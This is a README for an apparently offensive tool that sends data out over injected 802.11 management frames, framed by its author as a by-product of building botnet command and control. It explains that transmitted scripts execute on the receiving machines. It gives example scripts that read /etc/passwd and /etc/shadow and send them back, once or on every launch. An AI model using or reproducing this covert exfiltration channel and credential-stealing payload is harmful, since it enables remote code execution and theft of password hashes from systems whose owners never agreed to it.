# 80211Exfil
Uses 802.11 management frames to exfiltrate data (no network association required). You may need a WiFi card capable of injecting packets, alfa usb works well.

This tool is created from me trying to come up with a better botnet command
and control server. I did not do that but instead created a tool that makes pop-up 
overlay networks using 802.11 
management frames.

This tool transmits data over 802.11 management frames and has built in 
functionality to improve range, accuracy, and file transmission (TTL, self recovery,
redundancy, etc.).

Other people have built stuff like this, and It's not entirely practical for data exfiltration
just because it requires wireless cards that can inject. Still cool. just look in Network.py (
this is the file you run). Hell, I even optimized it a bit (which I never bother to do).

----
Use network.py to launch. 

If a client is listening, it will stich the file back together as well as retransmit
it out. Files have a TTL, an initial send count, and timeout to try to improve accuracy.

As is, devices need to be in monitor mode to receive. Files in the scripts folder are
processed at launch, files in the output are automatically transmitted; use scripts to 
produce output is the intended method of use. IF you transmit a script (identified by keyword
in the definitions class) it will run on the receiving machines (output sent out) and then be stored in the
script folder. 

If you want to run the script as a one-time execution add the word delete
to the second line of the file

e.g. the file below will return the passwd/shadow contents to receiving machines and delete the script
#!/bin/sh
#execute
cat /etc/passwd
cat /etc/shadow
e.g. the file below will return the passwd/shadow contents to receiving machines anytime the node is launched
#!/bin/sh
#store
cat /etc/passwd
cat /etc/shadow

I didn't bother with error checking so much, but there's a -h option.
@author ChrisJoinEngine
